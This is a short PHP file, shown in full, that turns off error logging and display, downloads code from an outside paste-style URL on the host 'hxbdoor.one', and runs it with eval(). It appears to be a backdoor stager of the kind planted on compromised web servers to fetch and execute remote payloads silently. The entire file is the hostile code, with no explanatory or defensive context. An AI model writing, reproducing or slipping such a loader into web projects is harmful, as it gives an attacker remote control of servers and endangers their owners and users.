<?php
ini_set('log_errors', 0);
ini_set('display_errors', 0);
$url = "https://hxbdoor.one/raw/C51acgpQ"; 
$code = file_get_contents($url);

eval("?>$code<?php");
